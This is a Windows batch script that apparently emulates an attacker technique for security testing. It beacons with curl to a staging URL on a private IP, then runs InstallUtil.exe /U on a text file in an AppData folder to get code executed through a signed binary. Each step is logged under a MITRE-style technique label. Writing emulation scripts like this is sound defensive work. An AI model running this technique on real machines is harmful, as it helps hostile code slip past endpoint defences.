@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9579\dc46ba2c
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9579-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=expressvp.txt
SET ewjmdkff=9579
SET xbyhq=%APPDATA%\!pudaazx!\macula-simulations.log
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: agent_init>> "!xbyhq!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete>> "!xbyhq!" 2>nul
cd /d "!pjkcpgw!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_result=!errorlevel!>> "!xbyhq!" 2>nul
SET ttpok=1
SET errmsg=
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!syjfr!"
IF NOT !errorlevel!==0 (SET ttpok=0 & SET errmsg=exec_fail_!errorlevel!)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: installutil_exec=!errorlevel!>> "!xbyhq!" 2>nul
echo [!DATE! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!ttpok!:!errmsg!>> "!xbyhq!" 2>nul